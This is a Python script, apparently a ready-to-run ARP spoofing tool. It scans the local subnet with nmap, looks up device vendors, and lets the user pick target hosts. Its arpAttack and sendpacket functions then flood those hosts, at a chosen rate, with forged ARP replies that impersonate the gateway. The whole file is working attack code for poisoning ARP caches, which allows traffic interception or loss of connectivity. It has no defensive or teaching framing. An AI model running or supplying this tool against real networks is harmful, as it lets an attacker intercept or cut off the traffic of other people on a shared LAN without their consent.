import threading
import nmap
import netifaces
import socket
import time
import os
import sys
import requests
from scapy.all import Ether, ARP, srp, sendp

def scanNetwork(network, gateway_ip):
    returnlist = []
    nm = nmap.PortScanner()
    a = nm.scan(hosts=network, arguments='-T4 -n -Pn')

    for k, v in a['scan'].items():
        if v['status']['state'] == 'up' and v['addresses']['ipv4'] != gateway_ip:
            try:
                mac_address = v['addresses']['mac']
                manufacturer = get_manufacturer(mac_address)
                returnlist.append([v['addresses']['ipv4'], f"{mac_address} ({manufacturer})"])
            except:
                pass

    return returnlist

def get_manufacturer(mac_address):
    mac_address = mac_address.replace(":", "").replace("-", "").upper()
    url = f"https://api.macvendors.com/{mac_address}"

    try:
        response = requests.get(url)
        if response.status_code == 200:
            return response.text
        else:
            return "Unknown"
    except requests.RequestException:
        return "Unknown"

def sendpacket(my_mac, gateway_ip, target_ip, target_mac, count):
    ether = Ether()
    ether.src = my_mac
    ether.dst = target_mac

    arp = ARP()
    arp.psrc = gateway_ip
    arp.hwsrc = my_mac
    arp.pdst = target_ip
    arp.hwdst = target_mac
    arp.op = 2

    packet = ether / arp
    for _ in range(count):
        sendp(packet, verbose=False)


def getMyIp_Mac():
    myhostname = socket.gethostname()
    myip = socket.gethostbyname(myhostname)
    return myip, getHostMac(myip)

def getGateWayIp_Mac():
    gateIp = netifaces.gateways()['default'][netifaces.AF_INET][0]
    getGateMac = getHostMac(gateIp)
    return gateIp, getGateMac

def getHostMac(host):
    try:
        query = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=host)
        ans, _ = srp(query, timeout=2, verbose=0)
        for _, rcv in ans:
            return rcv[Ether].src
    except:
        return False

def onlineIp():
    gateway_ip, _ = getGateWayIp_Mac()
    networks = gateway_ip[:-1] + '1/24'
    hostlist = scanNetwork(network=networks, gateway_ip=gateway_ip)
    return hostlist

def arpAttack(my_mac, gateway_ip, targets, pkt_per_sec):
    threads = []
    # 为每个目标创建一个发送包的线程
    for target_ip, target_mac in targets:
        # 基于期望的速率和目标数量计算要发送的包数
        t = threading.Thread(target=sendpacket, args=(my_mac, gateway_ip, target_ip, target_mac, pkt_per_sec))
        t.start()
        threads.append(t)
    # 等待所有线程完成
    for thread in threads:
        thread.join()

def scanningAnimation(message, done_event, continue_message):
    animation = ['   ', '.  ', '.. ', '...']
    while not done_event.is_set():
        for frame in animation:
            if done_event.is_set():
                break
            sys.stdout.write(f"\r{message}{frame}")
            sys.stdout.flush()
            time.sleep(0.5)
    # Continue with the next phase of animation
    message = continue_message
    for frame in animation:
        sys.stdout.write(f"\r{message}{frame}")
        sys.stdout.flush()
        time.sleep(0.5)
    sys.stdout.write("\r" + " " * (len(message) + 3) + "\r")
    sys.stdout.flush()

if __name__ == '__main__':
    stop_animation_event = threading.Event()

    t = threading.Thread(target=scanningAnimation, args=('Scanning', stop_animation_event, 'Searching MAC'))
    t.start()

    try:
        hostlist = onlineIp()
    except KeyboardInterrupt:
        print("Shutting down...")
        os._exit(1)
        
    stop_animation_event.set()
    t.join()  # Ensure the animation thread has completely ended

    print('\nOnline IPs:\n')
    
    for i in range(len(hostlist)):
        print(f'\033[92m[{i}]\033[0m: {hostlist[i][0]}\t\t{hostlist[i][1]}')
        
    target_indices = input('Enter the indices of the targets (e.g., 1 3 6): ')
    pkt = int(input('Enter packets per second: '))

    _, my_mac = getMyIp_Mac()
    gateway_ip, _ = getGateWayIp_Mac()

    selected_targets = [(hostlist[int(index)][0], hostlist[int(index)][1].split(" ")[0]) for index in target_indices.split()]

    print('Processing...')

    arpAttack(my_mac, gateway_ip, selected_targets, pkt)